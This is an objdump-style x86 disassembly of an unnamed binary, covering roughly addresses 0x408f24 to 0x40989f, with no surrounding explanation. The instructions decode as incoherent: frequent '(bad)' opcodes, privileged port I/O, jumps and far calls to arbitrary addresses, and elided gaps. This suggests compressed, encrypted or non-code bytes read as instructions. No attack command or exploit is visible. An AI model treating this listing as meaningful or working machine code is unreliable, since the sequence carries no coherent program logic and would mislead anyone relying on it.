  408f24:	sub    BYTE PTR [ebp+0x291e0694],dh
	...
  408f3a:	add    BYTE PTR [eax],al
  408f3c:	outs   dx,DWORD PTR ds:[esi]
  408f3d:	and    DWORD PTR [ebx+edi*8+0x2976fe4f],edx
  408f44:	pop    edi
  408f45:	test   DWORD PTR [eax+edx*2+0x5f],ecx
  408f49:	and    DWORD PTR [esi],eax
  408f4b:	add    al,0xc4
  408f4d:	std    
  408f4e:	imul   esp,DWORD PTR [edi+0x20],0xf428f619
  408f55:	fidivr DWORD PTR [ebp+ebp*2+0x3a]
  408f5a:	fisubr WORD PTR [eax]
  408f5c:	das    
  408f5d:	and    DWORD PTR [ecx],ebx
  408f5f:	sub    DWORD PTR [ebp+0x7d8fc10e],ebx
  408f65:	and    esi,ecx
  408f67:	sbb    al,0xea
  408f69:	lods   al,BYTE PTR ds:[esi]
  408f6a:	call   0xd14f1497
  408f6f:	jnp    0x408fd6
  408f71:	and    DWORD PTR [esi-0x49d5bad8],esi
  408f77:	sub    bh,dh
  408f79:	sub    eax,0x20ef639d
  408f7e:	sahf   
  408f7f:	outs   dx,BYTE PTR ds:[esi]
  408f80:	aam    0x18
  408f82:	xchg   esi,eax
  408f83:	sub    al,cl
  408f85:	cs dec ecx
  408f87:	sub    bh,dl
  408f89:	and    BYTE PTR [ebx+ebx*1],bh
  408f8c:	(bad)  
  408f8d:	and    BYTE PTR [esi+0x1b],bh
  408f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f91:	addr16 jbe 0x408fbc
  408f94:	mov    edi,0xb7308d5a
  408f99:	and    BYTE PTR [ecx+0x54],dl
  408f9c:	push   eax
  408f9d:	and    BYTE PTR [esi+0x28],bl
	...
  408fb0:	add    BYTE PTR [eax],al
  408fb2:	pop    ebp
  408fb3:	cmp    ebx,DWORD PTR [esi+0x28]
  408fb6:	lahf   
  408fb7:	das    
  408fb8:	and    DWORD PTR [ebx-0x69],esp
  408fbb:	and    BYTE PTR [esi+0x6e],al
  408fbe:	sbb    BYTE PTR [eax],0x3e
  408fc1:	sub    BYTE PTR [edi-0x371b0066],al
  408fc7:	cdq    
  408fc8:	pop    es
  408fc9:	inc    ecx
  408fca:	or     ah,BYTE PTR [edx]
  408fcc:	jmp    DWORD PTR [esi]
  408fce:	sbb    BYTE PTR [edx-0x10],bl
  408fd1:	push   ss
  408fd2:	sbb    BYTE PTR [eax],ah
  408fd4:	call   0xff60631e
  408fd9:	push   cs
  408fda:	xchg   esi,eax
  408fdb:	sbb    cl,ch
  408fdd:	xor    al,0x16
  408fdf:	and    bh,bh
  408fe1:	(bad)  
  408fe2:	xchg   ebp,eax
  408fe3:	sbb    al,0xe8
  408fe5:	inc    DWORD PTR [eax+eiz*1+0x12ad20ff]
  408fec:	add    BYTE PTR [ebx+ebp*4],bh
  408fef:	xor    al,BYTE PTR [ebx-0x53275b]
  408ff5:	inc    edx
  408ff6:	call   0xfc22051a
  408ffb:	pusha  
  408ffc:	popf   
  408ffd:	(bad)  
  408ffe:	xlat   BYTE PTR ds:[ebx]
  408fff:	lea    eax,[ebp-0x43]
  409002:	fs mov cl,0x3a
  409005:	sub    ah,dh
  409007:	pop    ds
  409008:	xor    eax,0xffc7153c
  40900d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40900e:	mov    eax,ds:0x191be807
  409013:	and    bh,bh
  409015:	add    DWORD PTR [eax],eax
	...
  409027:	add    BYTE PTR [edi+0x7be940dc],al
  40902d:	add    eax,0x1f73e900
  409032:	jne    0x409025
  409034:	jmp    0x408fdc
  409036:	cld    
  409037:	jbe    0x409050
  409039:	and    BYTE PTR [ebp+0x6d],dh
  40903c:	setp   BYTE PTR [edi]
  40903f:	push   ecx
  409040:	inc    ebp
  409041:	cmp    bh,0x5e
  409044:	in     eax,0x44
  409046:	add    al,0xe9
  409048:	ror    BYTE PTR [esp+ebp*8-0x1e4cf98],0x0
  409050:	ss call 0xee390bf
  409056:	push   DWORD PTR [ebp-0x6f]
  409059:	sti    
  40905a:	jno    0x408ff9
  40905c:	(bad)  
  40905d:	out    0x88,eax
  40905f:	inc    ebp
  409060:	adc    eax,0x59010383
  409065:	add    ecx,DWORD PTR [ebp-0x117017b]
  40906b:	call   FWORD PTR [ecx+0x5971d1fb]
  409071:	add    ecx,DWORD PTR [ebx]
  409073:	sar    BYTE PTR [ebp+0x48043c37],0x3
  40907a:	add    BYTE PTR [edi+0x2c],dh
  40907d:	jnp    0x409005
  40907f:	cmp    ebx,eax
  409081:	or     cl,BYTE PTR [ebp-0x116c17b]
  409087:	(bad)  
  409088:	fld    DWORD PTR [edx]
  40908a:	test   eax,0xa3
	...
  40909b:	add    BYTE PTR [eax],al
  40909d:	add    BYTE PTR [esi],ah
  40909f:	call   0x359f8f3
  4090a4:	out    dx,eax
  4090a5:	mov    esi,0x874e7e9
  4090aa:	xor    esi,esp
  4090ac:	sar    bh,0x46
  4090af:	sti    
  4090b0:	cmc    
  4090b1:	lahf   
  4090b2:	xchg   esi,eax
  4090b3:	in     eax,0xfe
  4090b5:	jne    0x40903c
  4090b7:	in     eax,0x74
  4090b9:	or     BYTE PTR [ecx+0x7b],dh
  4090bc:	pushf  
  4090bd:	jmp    DWORD PTR [esi-0x25]
  4090c0:	rol    DWORD PTR [ecx+ebx*8],0x37
  4090c4:	mov    ch,ah
  4090c6:	pop    edx
  4090c7:	fdivp  st(3),st
  4090c9:	push   0xffffffc9
  4090cb:	sbb    BYTE PTR ds:0xe722bcff,0xd
  4090d2:	je     0x4090b9
  4090d4:	dec    BYTE PTR [ecx+0x67e64c]
  4090da:	lock das 
  4090dc:	push   ss
  4090dd:	mov    esi,0x40e99308
  4090e2:	lock aaa 
  4090e4:	cmp    esi,DWORD PTR fs:[ecx]
  4090e7:	xor    BYTE PTR [esi],ah
  4090e9:	jne    0x4090d3
  4090eb:	(bad)  
  4090ec:	dec    edi
  4090ed:	les    esi,FWORD PTR [edi-0x13]
  4090f0:	and    eax,0xafe56c75
  4090f5:	pop    es
  4090f6:	pop    eax
  4090f7:	dec    esi
  4090f8:	mov    bh,bh
  4090fa:	pop    edi
  4090fb:	out    0x40,eax
  4090fd:	add    al,0xf0
  4090ff:	push   edx
  409100:	jp     0x4090ee
	...
  409112:	add    BYTE PTR [eax],al
  409114:	jno    0x409102
  409116:	dec    esi
  409117:	test   DWORD PTR [edi+0x1d],0x803c4577
  40911e:	es jne 0x409101
  409121:	sub    al,0xaf
  409123:	or     ebx,DWORD PTR [eax]
  409125:	cmp    al,0xb3
  409127:	jmp    DWORD PTR [edi]
  409129:	sbb    DWORD PTR [ebx+0xf],eax
  40912c:	jne    0x40916a
  40912e:	add    eax,DWORD PTR [eax]
  409130:	lock fs mov edi,0x32ff0f7
  409137:	add    BYTE PTR [edi],ch
  409139:	jecxz  0x40916a
  40913b:	push   edi
  40913d:	das    
  40913e:	add    ebp,DWORD PTR [edx-0x10]
  409141:	leave  
  409142:	add    ebp,DWORD PTR [edx-0x10]
  409145:	stc    
  409146:	add    ecx,DWORD PTR [ebp-0x732b8bd3]
  40914c:	jne    0x4091c9
  40914e:	sub    eax,0x24dfd7ff
  409153:	jne    0x40911d
  409155:	test   BYTE PTR [edi-0x4c9a2705],ch
  40915b:	(bad)  
  40915c:	mov    edi,0xed744328
  409161:	xchg   BYTE PTR [ebp+0x1],ch
  409164:	lock push es
  409166:	jmp    0xa82f5706
  40916b:	add    ebx,DWORD PTR [edi-0x76e4076d]
  409171:	push   0x9220254e
  409176:	sbb    DWORD PTR [edi+0x0],esi
	...
  409189:	add    BYTE PTR [ebp+0x12],ch
  40918c:	ss and eax,0x1b9ab67f
  409192:	cdq    
  409193:	push   0x8379252e
  409198:	sbb    DWORD PTR ds:0xd5111d67,ebp
  40919e:	jle    0x4091bd
  4091a0:	push   ss
  4091a1:	ja     0x409210
  4091a3:	es push ss
  4091a5:	and    eax,0x5890b64f
  4091aa:	or     ecx,eax
  4091ac:	call   0xfe5716d5
  4091b1:	and    al,0x37
  4091b3:	sbb    eax,0xeb17f774
  4091b8:	mov    ah,BYTE PTR [edi+eiz*1]
  4091bb:	(bad)  
  4091bc:	fs pop ds
  4091be:	daa    
  4091bf:	sbb    eax,0xa51799d6
  4091c4:	xchg   esp,eax
  4091c5:	call   0x6f06987a
  4091ca:	add    BYTE PTR ds:0x92ff24be,dl
  4091d0:	in     al,0x1b
  4091d2:	loop   0x40923c
  4091d4:	scas   al,BYTE PTR es:[edi]
  4091d5:	and    al,0x79
  4091d7:	adc    BYTE PTR [ebp+0x131ce72c],0x4
  4091de:	dec    eax
  4091df:	pop    edi
  4091e0:	rol    dl,cl
  4091e2:	xlat   BYTE PTR ds:[ebx]
  4091e3:	sbb    eax,0x1cc73354
  4091e8:	xchg   BYTE PTR [edi*1+0x2c910b],ah
	...
  4091ff:	add    BYTE PTR [ecx+0x3a76001c],dl
  409205:	sub    al,0x76
  409208:	aam    0x1b
  40920a:	push   0xffffffe9
  40920c:	mov    eax,DWORD PTR [edi+0x3b]
  40920f:	test   al,0xf3
  409211:	sbb    esi,DWORD PTR [ebp-0xe43ba7]
  409217:	dec    esi
  409218:	pop    esi
  409219:	adc    al,ch
  40921b:	and    eax,0x70ff1c12
  409220:	(bad)  
  409221:	cmp    dh,bh
  409223:	ss int3 
  409225:	mov    al,0xff
  409227:	shl    BYTE PTR [eax+eiz*8],0x40
  40922b:	jmp    0x1730e43c
  409230:	adc    al,0x1c
  409232:	call   FWORD PTR [edi+ebx*2+0x1448c124]
  409239:	sbb    al,0x89
  40923b:	ins    BYTE PTR es:[edi],dx
  40923c:	mov    ebx,0x58feff13
  409241:	sbb    al,0x67
  409243:	loop   0x409294
  409245:	(bad)  
  409246:	(bad)  
  409247:	in     eax,dx
  409248:	popf   
  409249:	push   ss
  40924a:	mul    esi
  40924c:	rcr    DWORD PTR [ebx],cl
  40924e:	jne    0x40923d
  409250:	retf   
  409251:	mov    eax,fs:0x858dd3d6
  409257:	mov    ch,0xeb
  409259:	sbb    edi,edi
  40925b:	push   0xffffff91
  40925d:	and    dh,bh
  40925f:	mov    esi,0x307406d3
	...
  409274:	add    BYTE PTR [eax],al
  409276:	outs   dx,DWORD PTR ds:[esi]
  409277:	pop    edx
  409278:	in     al,dx
  409279:	mov    dh,0x13
  40927b:	sbb    al,0x0
  40927d:	sbb    eax,0x91bd887c
  409282:	sti    
  409283:	sbb    edi,edi
  409285:	jmp    0xf9a83709
  40928a:	repz sub edi,DWORD PTR [esi+0x77d6e00]
  409291:	call   0x3f2ef6
  409296:	ds mov esi,0xe81ef7eb
  40929c:	(bad)  
  40929d:	jne    0x409240
  40929f:	out    dx,eax
  4092a0:	cmp    al,0x9b
  4092a2:	ds call 0x7248a6
  4092a8:	(bad)  
  4092a9:	(bad)  
  4092aa:	ds jle 0x4092b4
  4092ad:	call   0x3f2e90
  4092b2:	mov    esi,0xbef7dfbd
  4092b7:	out    0xfe,eax
  4092b9:	mov    ch,0xb5
  4092bb:	(bad)  
  4092bc:	(bad)  
  4092bd:	dec    DWORD PTR [esi]
  4092bf:	jle    0x4092c8
  4092c1:	call   0x3f2fb4
  4092c6:	(bad)  
  4092c7:	mov    ebp,0xe7fef7d7
  4092cc:	(bad)  
  4092cd:	jne    0x409310
  4092cf:	out    dx,eax
  4092d0:	or     al,0x9b
  4092d2:	ds call 0x1e48d6
  4092d8:	(bad)  
  4092d9:	inc    DWORD PTR [eax]
	...
  4092eb:	add    BYTE PTR [esi],bl
  4092ed:	jle    0x4092f6
  4092ef:	call   0x3f2c02
  4092f4:	ds mov esi,0xe83ef7d3
  4092fa:	(bad)  
  4092fb:	jne    0x40930e
  4092fd:	out    dx,eax
  4092fe:	lock call 0x35:0xb5fee82e
  409306:	(bad)  
  409307:	push   DWORD PTR [ecx]
  409309:	cld    
  40930a:	pushf  
  40930b:	call   FWORD PTR [esi-0x79134b1b]
  409311:	in     eax,0xfe
  409313:	call   0x401a91
  409318:	lock jo 0x409373
  40931b:	call   0xe8631ce7
  409320:	int    0xa3
  409322:	and    edi,edi
  409324:	mov    edi,0xb7f73ed3
  409329:	xchg   ecx,eax
  40932a:	sub    bl,dl
  40932c:	lea    ebp,[ecx-0x37a200df]
  409332:	sbb    edi,edi
  409334:	lahf   
  409335:	mov    eax,0xb1979d51
  40933a:	and    DWORD PTR [ebp-0xde4e5c],esi
  409340:	cwde   
  409341:	in     al,dx
  409342:	jg     0x409343
  409344:	jg     0x40931f
  409346:	push   edi
  409347:	lock jg 0x40931b
  40934a:	and    edi,edi
  40934c:	in     eax,0x3b
  40934e:	and    dh,BYTE PTR [ebp+0x0]
	...
  409361:	add    al,bh
  409363:	test   DWORD PTR [ecx],0x21f95ffe
  409369:	mov    ch,0x60
  40936b:	stc    
  40936c:	and    edi,edi
  40936e:	pop    eax
  40936f:	enter  0xff7f,0x47
  409373:	add    eax,ecx
  409375:	test   DWORD PTR [ecx+0x25],0x1137ff21
  40937c:	xchg   edi,eax
  40937d:	sti    
  40937e:	sbb    BYTE PTR [esi],bl
  409380:	mov    cl,0xff
  409382:	daa    
  409383:	push   edi
  409384:	inc    esi
  409385:	or     al,0xf0
  409387:	ror    BYTE PTR [esp+ebp*8+0x6a206c73],cl
  40938e:	lock lds eax,FWORD PTR [eax]
  409391:	(bad)  
  409392:	jge    0x4093ab
  409394:	sub    edi,DWORD PTR [edx-0x76dea6a6]
  40939a:	lods   eax,DWORD PTR ds:[esi]
  40939b:	push   ebx
  40939c:	lods   al,BYTE PTR ds:[esi]
  40939d:	shr    DWORD PTR [ebx],cl
  40939f:	out    dx,eax
  4093a0:	add    edi,edi
  4093a2:	sbb    eax,0x30eb1407
  4093a7:	pop    es
  4093a8:	sahf   
  4093a9:	xchg   edi,eax
  4093aa:	out    dx,eax
  4093ab:	cs test eax,0x119cf1f
  4093b1:	cmp    BYTE PTR [ebx],cl
  4093b3:	enter  0xabe8,0xf1
  4093b7:	push   es
  4093b8:	jmp    0xe0d44b40
  4093bd:	sub    ebx,DWORD PTR [esi+0x1b]
  4093c0:	outs   dx,BYTE PTR ds:[esi]
  4093c1:	and    DWORD PTR [edi+0x216493],esp
	...
  4093d7:	add    BYTE PTR ds:0x7a4f510f,ah
  4093dd:	sbb    DWORD PTR [esi+0x4b],edx
  4093e0:	mov    dl,0x2
  4093e2:	jmp    0x6a6b0e9d
  4093e7:	dec    eax
  4093e8:	jl     0x40939a
  4093ea:	xchg   ebp,eax
  4093eb:	lods   eax,DWORD PTR ds:[esi]
  4093ec:	ja     0x40939d
  4093ee:	or     BYTE PTR [ecx],ah
  4093f0:	in     eax,0xe
  4093f2:	inc    ecx
  4093f3:	mov    cl,0x89
  4093f5:	sbb    DWORD PTR [esi],esp
  4093f7:	mov    esi,DWORD PTR [ebp+0x6dd7721a]
  4093fd:	out    dx,al
  4093fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ff:	add    edi,DWORD PTR [ebx-0x25]
  409402:	(bad)  
  409403:	in     al,dx
  409404:	mov    al,0x6
  409406:	imul   esp,ecx,0xab87953f
  40940c:	adc    ebx,ebx
  40940e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40940f:	add    eax,esi
  409411:	cs xor eax,0x391927b1
  409417:	lods   al,BYTE PTR ds:[esi]
  409418:	add    eax,0xbf0427db
  40941d:	xor    DWORD PTR cs:[eax+0xd33190f],0xcec9330
  409428:	and    dl,BYTE PTR [edx+0x400fba12]
  40942e:	add    BYTE PTR [edi-0x97e7f0],cl
  409434:	mov    edi,0x220c38ff
  40943a:	mov    al,ds:0x9e
	...
  40944b:	add    BYTE PTR [eax],al
  40944d:	add    BYTE PTR [eax],dl
  40944f:	mov    bh,0x67
  409451:	jmp    0x1febc49
  409456:	fcmovnu st,st(4)
  409458:	inc    eax
  409459:	jmp    0xf1b5ade1
  40945e:	or     ebp,DWORD PTR [edx-0x3f]
  409461:	jbe    0x409433
  409463:	(bad)  cs:[ebp-0x30]
  409467:	pop    ss
  409468:	jmp    0x409452
  40946a:	test   eax,0x7ee93d98
  40946f:	push   ds
  409470:	inc    esi
  409471:	push   ebp
  409472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409473:	pop    eax
  409474:	mov    ecx,0xff17d04e
  409479:	cmp    eax,DWORD PTR [ecx]
  40947b:	fild   WORD PTR [esi]
  40947d:	mov    ah,0x70
  40947f:	sbb    BYTE PTR [ebp+0x35],dh
  409482:	adc    BYTE PTR [edx+0x7e3e4107],dl
  409488:	jmp    DWORD PTR [esi]
  40948a:	xor    BYTE PTR [edx+0x6ef2bc8],bh
  409490:	push   ebp
  409491:	bound  ebx,QWORD PTR [edi]
  409493:	test   ah,al
  409495:	or     eax,0x60b9210
  40949a:	data16 add al,ch
  40949d:	lds    edi,FWORD PTR [eax+0x3660ff17]
  4094a3:	sbb    al,0xff
  4094a5:	je     0x4094ae
  4094a7:	sbb    BYTE PTR [ebp-0xf],dh
  4094aa:	retf   
  4094ab:	jb     0x409441
  4094ad:	fdivrp st(7),st
  4094af:	mov    ecx,DWORD PTR [ebp-0x1b]
	...
  4094c2:	add    BYTE PTR [eax],al
  4094c4:	cli    
  4094c5:	inc    esi
  4094c6:	je     0x4094f3
  4094c8:	jae    0x4094a8
  4094ca:	(bad)  
  4094cb:	(bad)  
  4094cc:	mov    ebp,0x3575fe25
  4094d1:	jmp    0x409467
  4094d3:	pushf  
  4094d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094d5:	test   DWORD PTR [edi-0x1],0x75fef71c
  4094dc:	xchg   ebp,eax
  4094dd:	push   edx
  4094de:	(bad)  
  4094df:	jne    0x4094c2
  4094e1:	jmp    0x4094ae
  4094e3:	xchg   esi,eax
  4094e4:	neg    WORD PTR [ecx-0x75]
  4094e8:	in     al,0xf6
  4094ea:	cmp    BYTE PTR [ecx],0xc9
  4094ed:	jle    0x4094f8
  4094ef:	push   edx
  4094f0:	popa   
  4094f1:	push   edi
  4094f2:	fwait
  4094f3:	jmp    DWORD PTR [esi]
  4094f5:	sub    al,0xbf
  4094f7:	jmp    0x4094b6
  4094f9:	test   BYTE PTR [ebp+0x10],bh
  4094fc:	mov    DWORD PTR [edi+0x7],ebp
  4094ff:	mov    ecx,DWORD PTR [ebx+edx*1-0x2]
  409503:	jne    0x40952a
  409505:	mov    BYTE PTR [eax],al
  409507:	mov    ebx,ebx
  409509:	jmp    0x40950c
  40950b:	sub    ecx,ecx
  40950d:	leave  
  40950e:	ror    DWORD PTR [ecx+ecx*4],0x5e
  409512:	mov    ch,ah
  409514:	es jle 0x409522
  409517:	call   FWORD PTR [ebx+ecx*1-0x8204618]
  40951e:	(bad)  
  40951f:	(bad)  
  409520:	jl     0x409529
  409522:	push   eax
  409523:	jmp    FWORD PTR [ebx+ecx*1-0x18]
  409527:	xor    DWORD PTR [eax],eax
	...
  409539:	add    BYTE PTR [esi+0xbc9fef7],bh
  40953f:	or     eax,DWORD PTR [eax]
  409541:	push   ebp
  409542:	ret    0x82d6
  409545:	(bad)  
  409546:	fst    DWORD PTR [eax+0x56]
  409549:	push   ebx
  40954a:	call   0x8214:0xbd000765
  409551:	jge    0x409558
  409553:	add    esi,DWORD PTR [esp+ecx*1-0x10]
  409557:	lods   al,BYTE PTR ds:[esi]
  409558:	lahf   
  409559:	(bad)  
  40955b:	mov    cl,0x5
  40955d:	cmp    DWORD PTR [ebp+0x39],0x3
  409561:	jne    0x40954c
  409563:	hlt    
  409564:	inc    ebx
  409565:	pop    ebx
  409566:	dec    edi
  409567:	dec    BYTE PTR [edx+eax*8+0x0]
  40956b:	and    BYTE PTR [edx+0x22a0ec45],cl
  409571:	pop    es
  409572:	jae    0x409567
  409574:	sldt   WORD PTR [esp+0xa]
  409579:	sar    BYTE PTR [edi+eiz*1],0xea
  40957d:	mov    edi,0xc8bded1b
  409582:	mov    dl,0x30
  409584:	add    ecx,DWORD PTR [ebx-0x1f7dcbcb]
  40958a:	out    dx,eax
  40958b:	mov    al,ds:0x33f0139f
  409590:	pop    es
  409591:	or     esi,DWORD PTR [eax-0x4fd4f3c4]
  409597:	pop    ecx
  409598:	mov    esi,0xf2e2b95d
  40959d:	inc    DWORD PTR [eax]
	...
  4095af:	add    dl,cl
  4095b1:	call   0xa5250ad3
  4095b6:	(bad)  
  4095b7:	mov    edi,0xb436373
  4095bc:	addr16 pop ebx
  4095be:	inc    ebx
  4095bf:	call   0xff5f1ef0
  4095c4:	push   esp
  4095c5:	xchg   edi,eax
  4095c6:	mov    ebx,0xbe477b7b
  4095cc:	or     BYTE PTR [esp+eax*8-0x1],al
  4095d0:	js     0x4095eb
  4095d2:	add    eax,DWORD PTR [eax]
  4095d4:	lock adc BYTE PTR [esi-0x75],ah
  4095d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095d9:	daa    
  4095da:	mov    cl,BYTE PTR [ebp-0xc]
  4095dd:	adc    BYTE PTR [esi-0x73],ah
  4095e0:	mov    ch,0x6
  4095e2:	fnstenv [esi+edx*1-0x7ae25764]
  4095e9:	dec    edx
  4095ea:	rol    DWORD PTR [ebp+ecx*2+0x16],0xce
  4095ef:	sbb    eax,0x81d14a85
  4095f4:	pop    ebx
  4095f5:	push   ss
  4095f6:	mov    esi,0x6603651d
  4095fb:	(bad)  
  4095fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095fd:	mov    DWORD PTR [esp+eax*2],esp
  409600:	sti    
  409601:	adc    eax,0x7ec8441c
  409606:	sbb    BYTE PTR ds:0x482c7fcf,0xc4
  40960d:	jg     0x409633
  40960f:	dec    eax
  409610:	ins    DWORD PTR es:[edi],dx
  409611:	fwait
  409612:	js     0x40959d
	...
  409624:	add    BYTE PTR [eax],al
  409626:	xor    eax,0xaff4404b
  40962b:	adc    eax,0x544c10e9
  409630:	mov    cl,0xdf
  409632:	xor    BYTE PTR [edi],al
  409634:	mov    al,ds:0xe906f009
  409639:	adc    BYTE PTR [ecx+eax*4-0x24],dl
  40963d:	or     edi,DWORD PTR [ebx-0x3d]
  409640:	fcom   QWORD PTR [eax]
  409642:	push   esp
  409643:	sub    DWORD PTR [ebx+eiz*1+0x43b41620],0x6f
  40964b:	fwait
  40964c:	sub    al,0x2c
  40964e:	xlat   BYTE PTR ds:[ebx]
  40964f:	imul   ebp,DWORD PTR [esi],0x1d
  409652:	pop    edi
  409653:	fwait
  409654:	sub    al,0x2c
  409656:	and    dh,BYTE PTR [edx+0x1e]
  409659:	sbb    eax,0x139c834c
  40965e:	jne    0x4095f3
  409660:	and    BYTE PTR [ebx-0x20],bl
  409663:	push   es
  409664:	jmp    0x6caad96c
  409669:	xchg   edi,eax
  40966a:	dec    edi
  40966b:	dec    edi
  40966c:	add    cl,ah
  40966e:	repz push es
  409670:	add    dl,bh
  409672:	xchg   edi,eax
  409673:	mov    al,ds:0x4d2e7400
  409678:	push   eax
  409679:	rcr    ecx,1
  40967b:	add    BYTE PTR [eax],0xe9
  40967e:	js     0x40961b
  409680:	punpckldq mm3,DWORD PTR [esi-0x7]
  409684:	rcl    dh,0xf0
  409687:	add    edi,edi
  409689:	xor    eax,0x0
	...
  40969a:	add    BYTE PTR [eax],al
  40969c:	xchg   ebp,eax
  40969d:	and    DWORD PTR [edi],ecx
  40969f:	fs scas al,BYTE PTR es:[edi]
  4096a1:	sub    al,0x50
  4096a3:	pop    ss
  4096a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096a5:	sub    al,0x7b
  4096a7:	jbe    0x40969c
  4096a9:	push   es
  4096aa:	and    DWORD PTR [edi-0x69f53c05],0x5e
  4096b1:	and    ecx,DWORD PTR [edi]
  4096b3:	push   edi
  4096b4:	mov    ch,0x15
  4096b6:	add    DWORD PTR [ecx-0x2dfe6415],0x3
  4096bd:	loopne 0x409733
  4096bf:	(bad)  
  4096c1:	and    al,0x6a
  4096c3:	jmp    0xe9a9ab11
  4096c8:	dec    ecx
  4096c9:	adc    al,0x55
  4096cb:	pop    esi
  4096cc:	data16 add al,0x6a
  4096cf:	jmp    0x1027ab2d
  4096d4:	inc    eax
  4096d5:	adc    al,0xff
  4096d7:	repnz xor ebx,DWORD PTR [ebx+0x2ca39928]
  4096de:	aam    0x53
  4096e0:	add    al,0x14
  4096e2:	mov    edx,DWORD PTR [ecx]
  4096e4:	call   0x52b5:0xf392ff9e
  4096eb:	mov    bh,0xec
  4096ed:	cdq    
  4096ee:	jae    0x14037e7
  4096f4:	mov    al,ds:0xff49ffff
  4096fa:	mov    edi,0xe7572175
  4096ff:	popf   
	...
  409710:	add    BYTE PTR [eax],al
  409712:	ret    
  409713:	repnz (bad) 
  409715:	sub    eax,DWORD PTR [edx]
  409717:	jg     0x4096dc
  409719:	pop    ebx
  40971a:	scas   al,BYTE PTR es:[edi]
  40971b:	push   eax
  40971c:	enter  0x9c2,0x8
  409720:	push   ebp
  409721:	mov    ebp,DWORD PTR ds:0xc6f0c48c
  409727:	pop    ebx
  409728:	sub    bl,bl
  40972a:	cs jbe 0x409738
  40972d:	jmp    DWORD PTR [ebx+eax*1]
  409730:	call   0xff30db36
  409735:	push   eax
  409736:	mov    ?,WORD PTR [ebp+0x7]
  409739:	call   0x3f3075
  40973e:	inc    edx
  40973f:	repz push edi
  409741:	add    esp,DWORD PTR [ecx+0x3]
  409744:	shl    BYTE PTR [esi+edx*1+0x7e],0x45
  409749:	hlt    
  40974a:	(bad)  
  40974c:	je     0x40975a
  40974e:	cs jbe 0x409758
  409751:	call   0x3f8588
  409756:	adc    BYTE PTR [esi-0x5],al
  409759:	lea    eax,[edi+esi*8+0x4f]
  40975d:	jmp    DWORD PTR [ebx+ecx*1-0x206e8a01]
  409764:	cwde   
  409765:	std    
  409766:	lock mov BYTE PTR cs:[ebp+0x31],al
  40976b:	lock je 0x40975e
  40976e:	cs jbe 0x409768
  409771:	jmp    DWORD PTR [ebx+eax*1+0x75ff]
	...
  409788:	or     eax,0xefe10e3
  40978d:	lock mov bl,al
  409790:	out    dx,al
  409791:	jne    0x40978e
  409793:	call   0xffbde188
  409798:	aas    
  409799:	add    al,0x91
  40979b:	test   DWORD PTR [eax+0x41],0x772fff7d
  4097a2:	add    edx,DWORD PTR [edi+0x27]
  4097a5:	xchg   edx,eax
  4097a6:	or     ch,al
  4097a8:	dec    eax
  4097a9:	scas   al,BYTE PTR es:[edi]
  4097aa:	sbb    bh,bh
  4097ac:	imul   esp,DWORD PTR [eax-0x42],0x5e
  4097b0:	cmp    DWORD PTR [edi+0xb],ebx
  4097b3:	add    BYTE PTR [ebp+0x7d8326a8],bl
  4097b9:	xor    DWORD PTR [ecx],eax
  4097bb:	jb     0x40978e
  4097bd:	dec    esp
  4097be:	nop
  4097bf:	pxor   mm3,mm3
  4097c2:	or     ebp,eax
  4097c4:	jno    0x40977a
  4097c6:	sbb    edi,edi
  4097c8:	(bad)  
  4097ca:	repz (bad) 
  4097cc:	pop    ebp
  4097cd:	sbb    BYTE PTR [ebx],ch
  4097cf:	scas   eax,DWORD PTR es:[edi]
  4097d0:	int    0x71
  4097d2:	sbb    bh,bh
  4097d4:	cmp    eax,0xe8751a10
  4097d9:	xchg   DWORD PTR [edi-0x3],ebx
  4097dc:	mov    bh,0x89
  4097de:	sbb    dh,BYTE PTR [ebp+0x0]
  4097e1:	xchg   ecx,eax
  4097e2:	pop    DWORD PTR [edi]
  4097e4:	cwde   
  4097e5:	out    0x1a,al
  4097e7:	call   FWORD PTR [edi+0x13afa5]
	...
  4097fd:	add    BYTE PTR [ecx+0x1e],ch
  409800:	sbb    dh,BYTE PTR [ebp-0x20]
  409803:	mov    al,0x8f
  409805:	pop    es
  409806:	cwde   
  409807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409808:	pop    ss
  409809:	(bad)  
  40980a:	jg     0x4097a9
  40980c:	xchg   edi,eax
  40980d:	or     esi,ebx
  40980f:	push   ecx
  409810:	icebp  
  409811:	(bad)  
  409812:	in     eax,0x2f
  409814:	sbb    dh,BYTE PTR [ebp-0x8]
  409817:	(bad)  
  409818:	call   0x75:0x19e15ffc
  40981f:	pop    es
  409820:	es nop
  409822:	neg    DWORD PTR [esi]
  409824:	mov    WORD PTR [eax],ds
  409826:	inc    edi
  409827:	adc    dl,BYTE PTR [esi]
  409829:	nop
  40982a:	out    dx,eax
  40982b:	pushf  
  40982c:	lock sbb bh,BYTE PTR [ebp-0x7b91ef02]
  409833:	adc    bh,dh
  409835:	sbb    DWORD PTR [ebp-0x8700a0a],ebx
  40983b:	push   ds
  40983c:	int    0x6f
  40983e:	pop    ss
  40983f:	adc    dh,BYTE PTR [eax+0x3406e046]
  409845:	lea    edx,[edx+edx*1]
  409848:	pop    esp
  409849:	or     BYTE PTR [edx-0x107031f9],cl
  40984f:	push   ds
  409850:	jne    0x4098c2
  409852:	out    dx,eax
  409853:	adc    DWORD PTR [esi+0x3c11fb8f],edi
  409859:	or     al,0xc8
  40985b:	sub    DWORD PTR [edi+0x3c7dd719],ebp
  409861:	hlt    
	...
  409872:	add    BYTE PTR [eax],al
  409874:	js     0x40987a
  409876:	sahf   
  409877:	(bad)  
  409878:	sti    
  409879:	adc    DWORD PTR [esp+ecx*1],ebx
  40987c:	enter  0x8f39,0x19
  409880:	mov    bh,0x7d
  409882:	sbb    al,0xf0
  409884:	js     0x40988a
  409886:	jle    0x409817
  409888:	sti    
  409889:	adc    esp,edi
  40988b:	or     ecx,DWORD PTR [eax-0x68e690b7]
  409891:	jge    0x40984f
  409893:	sti    
  409894:	js     0x40989a
  409896:	xor    BYTE PTR [esi-0x24],al
  409899:	push   es
  40989a:	mov    esp,0x25858c8c
  40989f:	sub    BYTE PTR [esi],bl
